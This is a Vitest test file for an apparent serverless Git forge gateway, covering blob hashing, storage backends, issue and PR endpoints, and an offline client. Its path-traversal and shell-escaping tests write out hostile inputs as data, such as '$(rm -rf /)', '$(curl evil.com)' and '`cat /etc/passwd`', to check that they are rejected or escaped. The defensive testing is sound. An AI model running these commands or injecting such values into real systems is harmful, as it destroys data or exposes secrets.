import { describe, expect, it } from 'vitest';
import {
  computeSha1,
  getStorageBackend,
  isPathTraversal,
  KVStorageBackend,
  MemoryStorageBackend,
  R2StorageBackend,
  readGitRef,
  sanitizeId,
  saveGitLooseBlob,
  saveIssueMetadata,
  savePRMetadata,
  synthesizeGitBlob,
  updateGitRef,
  validateRefName,
  validateRepoName,
} from '../../functions/api/submit/storage.js';
import { handleIssueSubmission } from '../../functions/api/submit/issue.js';
import { handlePRSubmission } from '../../functions/api/submit/pr.js';
import { EdgeGatewayClient, escapeShellDoubleQuotes } from '../src/engine/edge-client.js';
import type {
  KVNamespaceLike,
  R2BucketLike,
  R2ObjectBodyLike,
  R2ObjectLike,
} from '../../functions/api/submit/types.js';

describe('Milestone 4: Serverless Edge Write Gateway & Storage Layer', () => {
  // =========================================================================
  // 1. Git Loose Blob Synthesis & SHA-1 Verification
  // =========================================================================
  describe('1. Standard Git Loose Object Synthesis & SHA-1 Hashing', () => {
    it('synthesizes empty blob and computes canonical Git empty blob SHA-1', async () => {
      const result = await synthesizeGitBlob('');
      // Canonical Git empty blob hash: e69de29bb2d1d6434b8b29ae775ad8c2e48c5391
      expect(result.oid).toBe('e69de29bb2d1d6434b8b29ae775ad8c2e48c5391');
      expect(result.size).toBe(0);

      // Verify loose header format: "blob 0\0" (7 bytes)
      expect(result.rawBlob.length).toBe(7);
      const headerStr = new TextDecoder().decode(result.rawBlob);
      expect(headerStr).toBe('blob 0\0');
    });

    it('synthesizes "hello world\\n" blob and matches Git standard SHA-1', async () => {
      const result = await synthesizeGitBlob('hello world\n');
      // Canonical Git hash for "hello world\n": 3b18e512dba79e4c8300dd08aeb37f8e728b8dad
      expect(result.oid).toBe('3b18e512dba79e4c8300dd08aeb37f8e728b8dad');
      expect(result.size).toBe(12);

      // Verify loose header format: "blob 12\0hello world\n"
      const decoded = new TextDecoder().decode(result.rawBlob);
      expect(decoded).toBe('blob 12\0hello world\n');
    });

    it('synthesizes "test\\n" blob and matches Git standard SHA-1', async () => {
      const result = await synthesizeGitBlob('test\n');
      // Canonical Git hash for "test\n": 9daeafb9864cf43055ae93beb0afd6c7d144bfa4
      expect(result.oid).toBe('9daeafb9864cf43055ae93beb0afd6c7d144bfa4');
      expect(result.size).toBe(5);
    });

    it('handles multi-byte UTF-8 characters and binary data accurately', async () => {
      const utf8Text = '🚀 Sendforge Static Forge ⚡️ 日本語 漢字';
      const result = await synthesizeGitBlob(utf8Text);
      const encodedContent = new TextEncoder().encode(utf8Text);

      expect(result.size).toBe(encodedContent.length);
      expect(result.rawBlob.length).toBe(encodedContent.length + `blob ${encodedContent.length.toString()}\0`.length);

      // Binary payload
      const binaryData = new Uint8Array([0x00, 0xff, 0x10, 0x20, 0x7f, 0x80]);
      const binResult = await synthesizeGitBlob(binaryData);
      expect(binResult.size).toBe(6);
      expect(binResult.rawBlob.slice(0, 7)).toEqual(new TextEncoder().encode('blob 6\0'));
      expect(binResult.rawBlob.slice(7)).toEqual(binaryData);
    });

    it('computes SHA-1 hex format strictly as 40 lowercase characters', async () => {
      const sha = await computeSha1(new TextEncoder().encode('deterministic-test-payload'));
      expect(sha).toMatch(/^[0-9a-f]{40}$/);
      expect(sha.length).toBe(40);
    });
  });

  // =========================================================================
  // 2. Storage Backends (Memory, KV, R2) & Ref Updates
  // =========================================================================
  describe('2. Multi-Backend Storage Abstraction & Git Ref Persistence', () => {
    it('stores and retrieves Git loose objects and refs in MemoryStorageBackend', async () => {
      const memory = new MemoryStorageBackend();

      const blobResult = await saveGitLooseBlob(memory, 'test-owner/test-repo', 'Sample issue content\n');
      expect(blobResult.oid).toMatch(/^[0-9a-f]{40}$/);
      expect(blobResult.storagePath).toBe(`test-owner/test-repo/objects/${blobResult.oid.slice(0, 2)}/${blobResult.oid.slice(2)}`);

      // Verify loose blob is readable
      const storedBlobBytes = await memory.get(blobResult.storagePath);
      expect(storedBlobBytes).toBeDefined();
      expect(storedBlobBytes).toEqual(blobResult.rawBlob);

      // Write and read ref
      await updateGitRef(memory, 'test-owner/test-repo', 'refs/issues/1', blobResult.oid);
      const refVal = await readGitRef(memory, 'test-owner/test-repo', 'refs/issues/1');
      expect(refVal).toBe(blobResult.oid);

      // Check keys list
      const keys = await memory.list('test-owner/test-repo');
      expect(keys.length).toBe(2);
      expect(keys).toContain(blobResult.storagePath);
      expect(keys).toContain('test-owner/test-repo/refs/issues/1');
    });

    it('works seamlessly with Cloudflare KV storage backend', async () => {
      const kvStore = new Map<string, string | Uint8Array>();
      const mockKV: KVNamespaceLike = {
        put: async (key: string, value: string | ArrayBuffer | ArrayBufferView | ReadableStream) => {
          if (typeof value === 'string') {
            kvStore.set(key, value);
          } else if (value instanceof Uint8Array) {
            kvStore.set(key, value);
          } else if (value instanceof ArrayBuffer) {
            kvStore.set(key, new Uint8Array(value));
          } else if (ArrayBuffer.isView(value)) {
            const buf = new Uint8Array(value.byteLength);
            buf.set(new Uint8Array(value.buffer, value.byteOffset, value.byteLength));
            kvStore.set(key, buf);
          }
        },
        get: async <T = unknown>(key: string, optionsOrType?: { type?: 'text' | 'json' | 'arrayBuffer' | 'stream' } | 'text' | 'arrayBuffer' | 'json'): Promise<string | ArrayBuffer | T | null> => {
          const raw = kvStore.get(key);
          if (!raw) return null;
          const type = typeof optionsOrType === 'string' ? optionsOrType : optionsOrType?.type;
          if (type === 'arrayBuffer') {
            if (typeof raw === 'string') {
              const enc = new TextEncoder().encode(raw);
              const copy = new Uint8Array(enc.length);
              copy.set(enc);
              return copy.buffer;
            }
            const copy = new Uint8Array(raw.length);
            copy.set(raw);
            return copy.buffer;
          }
          if (type === 'json') {
            const str = typeof raw === 'string' ? raw : new TextDecoder().decode(raw);
            return JSON.parse(str) as T;
          }
          return typeof raw === 'string' ? raw : new TextDecoder().decode(raw);
        },
        delete: async (key: string) => {
          kvStore.delete(key);
        },
        list: async (options?: { prefix?: string | undefined }) => {
          const prefix = options?.prefix ?? '';
          const keys = Array.from(kvStore.keys())
            .filter((k) => k.startsWith(prefix))
            .map((name) => ({ name }));
          return { keys };
        },
      };

      const kvBackend = new KVStorageBackend(mockKV);
      await kvBackend.put('refs/heads/main', '1111111111111111111111111111111111111111\n');
      const readMain = await kvBackend.getText('refs/heads/main');
      expect(readMain?.trim()).toBe('1111111111111111111111111111111111111111');

      const listed = await kvBackend.list('refs/');
      expect(listed).toContain('refs/heads/main');
    });

    it('works seamlessly with Cloudflare R2 storage backend', async () => {
      const r2Store = new Map<string, { bytes: Uint8Array; contentType?: string | undefined }>();
      const mockR2: R2BucketLike = {
        put: async (key: string, value: ReadableStream | ArrayBuffer | ArrayBufferView | string | null | Blob, options?: { httpMetadata?: { contentType?: string | undefined } | undefined }) => {
          let bytes: Uint8Array;
          if (typeof value === 'string') {
            bytes = new TextEncoder().encode(value);
          } else if (value instanceof Uint8Array) {
            bytes = value;
          } else if (value instanceof ArrayBuffer) {
            bytes = new Uint8Array(value);
          } else {
            bytes = new Uint8Array();
          }
          r2Store.set(key, { bytes, contentType: options?.httpMetadata?.contentType });
          return {};
        },
        get: async (key: string) => {
          const entry = r2Store.get(key);
          if (!entry) return null;
          const body: R2ObjectBodyLike = {
            body: new ReadableStream<Uint8Array>(),
            arrayBuffer: async () => {
              const copy = new Uint8Array(entry.bytes.length);
              copy.set(entry.bytes);
              return copy.buffer;
            },
            text: async () => new TextDecoder().decode(entry.bytes),
            json: async <T>() => JSON.parse(new TextDecoder().decode(entry.bytes)) as T,
          };
          return body;
        },
        delete: async (keys: string | readonly string[]) => {
          const keyArray: readonly string[] = typeof keys === 'string' ? [keys] : keys;
          for (const k of keyArray) {
            r2Store.delete(k);
          }
        },
        list: async (options?: { prefix?: string }) => {
          const prefix = options?.prefix ?? '';
          const objects: R2ObjectLike[] = [];
          for (const [key, val] of r2Store.entries()) {
            if (key.startsWith(prefix)) {
              objects.push({ key, size: val.bytes.length });
            }
          }
          return { objects };
        },
      };

      const r2Backend = new R2StorageBackend(mockR2);
      const blob = await saveGitLooseBlob(r2Backend, 'repo-a', 'R2 Loose Blob Test');
      expect(blob.oid).toMatch(/^[0-9a-f]{40}$/);

      const retrieved = await r2Backend.getText(blob.storagePath);
      expect(retrieved).toContain('R2 Loose Blob Test');

      const storageFactoryR2 = getStorageBackend({ STORAGE_BUCKET: mockR2 });
      expect(storageFactoryR2).toBeInstanceOf(R2StorageBackend);
    });

    it('persists and updates issue & PR metadata files (aggregate & individual)', async () => {
      const storage = new MemoryStorageBackend();

      // Save issue metadata
      await saveIssueMetadata(storage, 'owner/repo', {
        id: '1',
        number: 1,
        title: 'Issue 1',
        description: 'First issue',
        author: { name: 'Alice', email: 'alice@test.org' },
        status: 'open',
        created_at: 1000,
        updated_at: 1000,
        labels: ['bug'],
        comments: [],
      });

      await saveIssueMetadata(storage, 'owner/repo', {
        id: '2',
        number: 2,
        title: 'Issue 2',
        description: 'Second issue',
        author: { name: 'Bob', email: 'bob@test.org' },
        status: 'open',
        created_at: 2000,
        updated_at: 2000,
        labels: ['enhancement'],
        comments: [],
      });

      const issue1 = await storage.getJson<{ title: string }>('owner/repo/meta/issues/1.json');
      expect(issue1?.title).toBe('Issue 1');

      const issuesList = await storage.getJson<{ number: number; title: string }[]>('owner/repo/issues.json');
      expect(issuesList?.length).toBe(2);
      expect(issuesList?.[0]?.number).toBe(2); // Sorted descending
      expect(issuesList?.[1]?.number).toBe(1);

      // Save PR metadata
      await savePRMetadata(storage, 'owner/repo', {
        id: '1',
        number: 1,
        title: 'PR 1',
        description: 'First PR',
        author: { name: 'Charlie', email: 'charlie@test.org' },
        target_branch: 'main',
        source_branch: 'feat/test',
        head_commit: '1111111111111111111111111111111111111111',
        status: 'open',
        created_at: 1500,
        updated_at: 1500,
        labels: ['feature'],
        comments: [],
      });

      const pr1 = await storage.getJson<{ source_branch: string }>('owner/repo/meta/pulls/1.json');
      expect(pr1?.source_branch).toBe('feat/test');

      const pullsList = await storage.getJson<{ number: number }[]>('owner/repo/pulls.json');
      expect(pullsList?.length).toBe(1);
    });
  });

  // =========================================================================
  // 3. Path Traversal Defense & Sanitization
  // =========================================================================
  describe('3. Path Traversal Defense & Identifier Sanitization', () => {
    it('detects malicious path traversal attempts reliably', () => {
      expect(isPathTraversal('../../etc/passwd')).toBe(true);
      expect(isPathTraversal('..\\..\\windows\\win.ini')).toBe(true);
      expect(isPathTraversal('valid/path/../traversal')).toBe(true);
      expect(isPathTraversal('repo/%2e%2e/admin')).toBe(true);
      expect(isPathTraversal('/leading/slash')).toBe(true);
      expect(isPathTraversal('\\leading\\backslash')).toBe(true);
      expect(isPathTraversal('null\0byte')).toBe(true);

      // Valid paths
      expect(isPathTraversal('valid-repo')).toBe(false);
      expect(isPathTraversal('owner/repo')).toBe(false);
      expect(isPathTraversal('refs/issues/42')).toBe(false);
    });

    it('sanitizes custom IDs to Sendforge conventions ([a-zA-Z0-9._-]) and strips traversal', () => {
      expect(sanitizeId('../../malicious')).toBe('malicious');
      expect(sanitizeId('Issue #100 - Broken! (Critical)')).toBe('Issue__100_-_Broken___Critical_');
      expect(sanitizeId('feat/branch_name')).toBe('featbranch_name');
      expect(sanitizeId(42)).toBe('42');
      expect(sanitizeId('   ')).toBe('1');
      expect(sanitizeId(undefined, 'fallback-id')).toBe('fallback-id');
    });

    it('validates repository and Git ref naming strictness', () => {
      expect(validateRepoName('owner/repo').valid).toBe(true);
      expect(validateRepoName('simple-repo').valid).toBe(true);
      expect(validateRepoName('org/team/repo').valid).toBe(true);
      expect(validateRepoName('../../etc/passwd').valid).toBe(false);
      expect(validateRepoName('owner//repo').valid).toBe(false);
      expect(validateRepoName('a/b/c/d').valid).toBe(false);

      expect(validateRefName('refs/issues/1').valid).toBe(true);
      expect(validateRefName('refs/pull/42/head').valid).toBe(true);
      expect(validateRefName('refs/pull/42/meta').valid).toBe(true);
      expect(validateRefName('refs/heads/main').valid).toBe(true);
      expect(validateRefName('not-refs/invalid').valid).toBe(false);
      expect(validateRefName('refs/../traversal').valid).toBe(false);
      expect(validateRefName('refs/heads/feature branch').valid).toBe(false);
      expect(validateRefName('refs/heads/tag~1').valid).toBe(false);
    });
  });

  // =========================================================================
  // 4. Edge API Endpoint: POST /api/submit/issue
  // =========================================================================
  describe('4. Serverless Edge API: Issue Submission Endpoint', () => {
    it('creates an issue, synthesizes Git loose blob, and writes refs/issues/<id>', async () => {
      const storage = new MemoryStorageBackend();

      const req = new Request('https://forge.local/api/submit/issue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          repo: 'sendforge/core',
          title: 'Buffer bounds overflow in delta decoder',
          description: 'Observed intermittent panic on negative OFS_DELTA offsets.',
          author: {
            name: 'Security Lead',
            email: 'sec@sendforge.org',
          },
          labels: ['security', 'bug'],
          custom_id: '10',
        }),
      });

      const res = await handleIssueSubmission(req, undefined, storage);
      expect(res.status).toBe(201);
      expect(res.headers.get('Content-Type')).toContain('application/json');
      expect(res.headers.get('Access-Control-Allow-Origin')).toBe('*');

      const body = (await res.json()) as {
        success: boolean;
        issue: {
          id: string;
          number: number;
          title: string;
          description: string;
          author: { name: string; email: string };
          status: string;
          labels: string[];
        };
        ref: string;
        oid: string;
      };

      expect(body.success).toBe(true);
      expect(body.issue.id).toBe('10');
      expect(body.issue.number).toBe(10);
      expect(body.issue.title).toBe('Buffer bounds overflow in delta decoder');
      expect(body.issue.author.name).toBe('Security Lead');
      expect(body.issue.labels).toEqual(['security', 'bug']);
      expect(body.ref).toBe('refs/issues/10');
      expect(body.oid).toMatch(/^[0-9a-f]{40}$/);

      // Verify the Git ref in storage points to the loose blob OID
      const refSha = await readGitRef(storage, 'sendforge/core', 'refs/issues/10');
      expect(refSha).toBe(body.oid);

      // Verify the loose blob exists and contains the serialized issue
      const blobBytes = await storage.get(`sendforge/core/objects/${body.oid.slice(0, 2)}/${body.oid.slice(2)}`);
      expect(blobBytes).not.toBeNull();
      if (blobBytes) {
        const rawText = new TextDecoder().decode(blobBytes);
        expect(rawText).toContain('blob ');
        expect(rawText).toContain('Buffer bounds overflow in delta decoder');
      }
    });

    it('rejects invalid payload schemas and path traversal attacks with 400 Bad Request', async () => {
      const storage = new MemoryStorageBackend();

      // 1. Missing Title
      const req1 = new Request('https://forge.local/api/submit/issue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ description: 'No title' }),
      });
      const res1 = await handleIssueSubmission(req1, undefined, storage);
      expect(res1.status).toBe(400);

      // 2. Empty Title
      const req2 = new Request('https://forge.local/api/submit/issue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: '   ' }),
      });
      const res2 = await handleIssueSubmission(req2, undefined, storage);
      expect(res2.status).toBe(400);

      // 3. Title Exceeding 255 Characters
      const req3 = new Request('https://forge.local/api/submit/issue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'A'.repeat(256) }),
      });
      const res3 = await handleIssueSubmission(req3, undefined, storage);
      expect(res3.status).toBe(400);

      // 4. Malformed JSON Body
      const req4 = new Request('https://forge.local/api/submit/issue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{ malformed json: ...',
      });
      const res4 = await handleIssueSubmission(req4, undefined, storage);
      expect(res4.status).toBe(400);

      // 5. Malicious Path Traversal in Repo Name
      const req5 = new Request('https://forge.local/api/submit/issue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ repo: '../../etc/passwd', title: 'Attack' }),
      });
      const res5 = await handleIssueSubmission(req5, undefined, storage);
      expect(res5.status).toBe(400);

      // 6. Malicious Path Traversal in Custom ID
      const req6 = new Request('https://forge.local/api/submit/issue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'Attack ID', custom_id: '../../root' }),
      });
      const res6 = await handleIssueSubmission(req6, undefined, storage);
      expect(res6.status).toBe(400);
    });

    it('handles OPTIONS preflight requests with 204 No Content and CORS headers', async () => {
      const req = new Request('https://forge.local/api/submit/issue', {
        method: 'OPTIONS',
      });
      const res = await handleIssueSubmission(req);
      expect(res.status).toBe(204);
      expect(res.headers.get('Access-Control-Allow-Origin')).toBe('*');
      expect(res.headers.get('Access-Control-Allow-Methods')).toContain('POST');
    });

    it('rejects unsupported HTTP methods with 405 Method Not Allowed', async () => {
      const req = new Request('https://forge.local/api/submit/issue', {
        method: 'GET',
      });
      const res = await handleIssueSubmission(req);
      expect(res.status).toBe(405);
    });
  });

  // =========================================================================
  // 5. Edge API Endpoint: POST /api/submit/pr
  // =========================================================================
  describe('5. Serverless Edge API: Pull Request Submission Endpoint', () => {
    it('creates a pull request with patch loose blob, head ref, and meta ref', async () => {
      const storage = new MemoryStorageBackend();

      const patchText = `From 1111111111111111111111111111111111111111 Mon Sep 17 00:00:00 2001
From: Contributor <contrib@test.org>
Date: Wed, 26 Aug 2026 00:00:00 +0000
Subject: [PATCH] Fix bounds check

---
 src/engine/delta.ts | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
`;

      const req = new Request('https://forge.local/api/submit/pr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          repo: 'sendforge/core',
          title: 'Implement zero-copy byte range decompression',
          description: 'Accelerates packfile object reads by 40%.',
          author: 'Alex Engineer',
          source_branch: 'feat/zero-copy',
          target_branch: 'main',
          patch: patchText,
          labels: ['performance', 'optimization'],
          custom_id: '5',
        }),
      });

      const res = await handlePRSubmission(req, undefined, storage);
      expect(res.status).toBe(201);

      const body = (await res.json()) as {
        success: boolean;
        pull: {
          id: string;
          number: number;
          title: string;
          source_branch: string;
          target_branch: string;
          head_commit: string;
          author: { name: string; email: string };
        };
        ref: string;
        meta_ref: string;
        oid: string;
      };

      expect(body.success).toBe(true);
      expect(body.pull.id).toBe('5');
      expect(body.pull.number).toBe(5);
      expect(body.pull.source_branch).toBe('feat/zero-copy');
      expect(body.pull.author.name).toBe('Alex Engineer');
      expect(body.ref).toBe('refs/pull/5/head');
      expect(body.meta_ref).toBe('refs/pull/5/meta');

      // Verify refs in storage
      const headRefSha = await readGitRef(storage, 'sendforge/core', 'refs/pull/5/head');
      const metaRefSha = await readGitRef(storage, 'sendforge/core', 'refs/pull/5/meta');

      expect(headRefSha).toMatch(/^[0-9a-f]{40}$/);
      expect(metaRefSha).toBe(body.oid);

      // Verify metadata blob in storage
      const metaBlobBytes = await storage.get(`sendforge/core/objects/${body.oid.slice(0, 2)}/${body.oid.slice(2)}`);
      expect(metaBlobBytes).not.toBeNull();
      if (metaBlobBytes) {
        const metaText = new TextDecoder().decode(metaBlobBytes);
        expect(metaText).toContain('Implement zero-copy byte range decompression');
      }
    });

    it('rejects invalid PR payloads (missing source branch, bad ref characters) with 400', async () => {
      const storage = new MemoryStorageBackend();

      // 1. Missing source branch
      const req1 = new Request('https://forge.local/api/submit/pr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'PR without branch' }),
      });
      const res1 = await handlePRSubmission(req1, undefined, storage);
      expect(res1.status).toBe(400);

      // 2. Path traversal in branch name
      const req2 = new Request('https://forge.local/api/submit/pr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          title: 'PR with bad branch',
          source_branch: '../../malicious-branch',
        }),
      });
      const res2 = await handlePRSubmission(req2, undefined, storage);
      expect(res2.status).toBe(400);

      // 3. Invalid head commit SHA
      const req3 = new Request('https://forge.local/api/submit/pr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          title: 'PR with bad SHA',
          source_branch: 'feat/test',
          head_commit: 'invalid_non_hex_sha',
        }),
      });
      const res3 = await handlePRSubmission(req3, undefined, storage);
      expect(res3.status).toBe(400);
    });

    it('auto-increments PR numbers when custom_id is omitted', async () => {
      const storage = new MemoryStorageBackend();

      const req1 = new Request('https://forge.local/api/submit/pr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          repo: 'org/repo',
          title: 'PR 1',
          source_branch: 'b1',
        }),
      });
      const res1 = await handlePRSubmission(req1, undefined, storage);
      const data1 = (await res1.json()) as { pull: { number: number } };
      expect(data1.pull.number).toBe(1);

      const req2 = new Request('https://forge.local/api/submit/pr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          repo: 'org/repo',
          title: 'PR 2',
          source_branch: 'b2',
        }),
      });
      const res2 = await handlePRSubmission(req2, undefined, storage);
      const data2 = (await res2.json()) as { pull: { number: number } };
      expect(data2.pull.number).toBe(2);
    });
  });

  // =========================================================================
  // 6. Client Edge SDK & Fallback Engine
  // =========================================================================
  describe('6. Client Edge SDK (edge-client.ts) & Offline Fallback', () => {
    it('submits issue via typed client SDK with successful edge response', async () => {
      const mockStorage = new MemoryStorageBackend();

      // Create a mock fetch that routes to handleIssueSubmission
      const mockFetch = async (input: RequestInfo | URL, init?: RequestInit): Promise<Response> => {
        const req = new Request(input, init);
        return handleIssueSubmission(req, undefined, mockStorage);
      };

      const client = new EdgeGatewayClient({
        baseUrl: 'https://forge.local',
        fetchFn: mockFetch,
      });

      const result = await client.submitIssue({
        repo: 'acme/tools',
        title: 'CLI export crash on empty tag ref',
        description: 'Export fails when tag points to tree instead of commit.',
        author: { name: 'QA Tester', email: 'qa@acme.org' },
        labels: ['bug', 'cli'],
        customId: 1,
      });

      expect(result.success).toBe(true);
      expect(result.fallbackUsed).toBe(false);
      expect(result.data?.id).toBe('1');
      expect(result.data?.title).toBe('CLI export crash on empty tag ref');
      expect(result.ref).toBe('refs/issues/1');
    });

    it('submits PR via typed client SDK with successful edge response', async () => {
      const mockStorage = new MemoryStorageBackend();

      const mockFetch = async (input: RequestInfo | URL, init?: RequestInit): Promise<Response> => {
        const req = new Request(input, init);
        return handlePRSubmission(req, undefined, mockStorage);
      };

      const client = new EdgeGatewayClient({
        baseUrl: 'https://forge.local',
        fetchFn: mockFetch,
      });

      const result = await client.submitPullRequest({
        repo: 'acme/tools',
        title: 'Add support for annotated tags in exporter',
        sourceBranch: 'feat/tag-export',
        targetBranch: 'main',
        headCommit: '2222222222222222222222222222222222222222',
        customId: '42',
      });

      expect(result.success).toBe(true);
      expect(result.data?.id).toBe('42');
      expect(result.ref).toBe('refs/pull/42/head');
      expect(result.metaRef).toBe('refs/pull/42/meta');
    });

    it('generates accurate local Git push commands for offline use', () => {
      const client = new EdgeGatewayClient();

      const issueCmds = client.generateLocalIssueCommands({
        title: 'Bug in blame calculation',
        description: 'Off-by-one line count',
        customId: '99',
      });

      expect(issueCmds.pushCommand).toBe('git push origin HEAD:refs/issues/99');
      expect(issueCmds.commitHelperCommand).toContain('git commit --allow-empty -m "Bug in blame calculation"');
      expect(issueCmds.commitHelperCommand).toContain('git push origin HEAD:refs/issues/99');

      const prCmds = client.generateLocalPRCommands({
        title: 'Optimize DAG traversal',
        sourceBranch: 'refs/heads/feat/dag-perf',
        customId: '101',
        patch: 'diff content...',
      });

      expect(prCmds.pushCommand).toBe('git push origin feat/dag-perf:refs/pull/101/head');
      expect(prCmds.patchFileName).toBe('0001-optimize-dag-traversal.patch');
    });

    it('safely escapes shell metacharacters in local Git commit commands', () => {
      const client = new EdgeGatewayClient();

      expect(escapeShellDoubleQuotes('Simple title')).toBe('Simple title');
      expect(escapeShellDoubleQuotes('Fix $USER issue')).toBe('Fix \\$USER issue');
      expect(escapeShellDoubleQuotes('Exploit `whoami`')).toBe('Exploit \\`whoami\\`');
      expect(escapeShellDoubleQuotes('Subshell $(rm -rf /)')).toBe('Subshell \\$(rm -rf /)');
      expect(escapeShellDoubleQuotes('Quote "injection" & \\slash')).toBe('Quote \\"injection\\" & \\\\slash');

      const dangerousCmds = client.generateLocalIssueCommands({
        title: 'Fix $(curl evil.com) in $HOME',
        description: 'Vulnerability with `cat /etc/passwd` and "quotes" and \\backslashes',
        customId: '102',
      });

      expect(dangerousCmds.commitHelperCommand).toBe(
        'git commit --allow-empty -m "Fix \\$(curl evil.com) in \\$HOME" -m "Vulnerability with \\`cat /etc/passwd\\` and \\"quotes\\" and \\\\backslashes" && git push origin HEAD:refs/issues/102'
      );
    });

    it('handles offline fallback: persists draft and generates commands on network failure', async () => {
      // Mock fetch throwing network error (e.g. offline)
      const failingFetch = (): Promise<Response> => {
        return Promise.reject(new Error('Failed to fetch (offline)'));
      };

      const client = new EdgeGatewayClient({
        baseUrl: 'https://unreachable-edge.forge.local',
        fetchFn: failingFetch,
      });

      // Submit Issue with fallback
      const issueResult = await client.submitIssueWithFallback({
        repo: 'my-project',
        title: 'Offline issue creation test',
        description: 'Saved locally for later sync',
        customId: '77',
      });

      expect(issueResult.success).toBe(false);
      expect(issueResult.fallbackUsed).toBe(true);
      expect(issueResult.offlineStored).toBe(true);
      expect(issueResult.localCommands?.pushCommand).toBe('git push origin HEAD:refs/issues/77');

      // Verify draft is stored in offline drafts list
      const savedIssueDrafts = client.getOfflineIssueDrafts('my-project');
      expect(savedIssueDrafts.length).toBe(1);
      expect(savedIssueDrafts[0]?.payload.title).toBe('Offline issue creation test');

      // Submit PR with fallback
      const prResult = await client.submitPullRequestWithFallback({
        repo: 'my-project',
        title: 'Offline PR creation test',
        sourceBranch: 'feat/offline',
        customId: '88',
      });

      expect(prResult.success).toBe(false);
      expect(prResult.fallbackUsed).toBe(true);
      expect(prResult.offlineStored).toBe(true);
      expect(prResult.localCommands?.pushCommand).toBe('git push origin feat/offline:refs/pull/88/head');

      const savedPRDrafts = client.getOfflinePRDrafts('my-project');
      expect(savedPRDrafts.length).toBe(1);
      expect(savedPRDrafts[0]?.payload.sourceBranch).toBe('feat/offline');

      // Test draft clearance
      if (savedIssueDrafts[0]) {
        client.clearOfflineIssueDraft('my-project', savedIssueDrafts[0].id);
        expect(client.getOfflineIssueDrafts('my-project').length).toBe(0);
      }
      if (savedPRDrafts[0]) {
        client.clearOfflinePRDraft('my-project', savedPRDrafts[0].id);
        expect(client.getOfflinePRDrafts('my-project').length).toBe(0);
      }
    });
  });
});
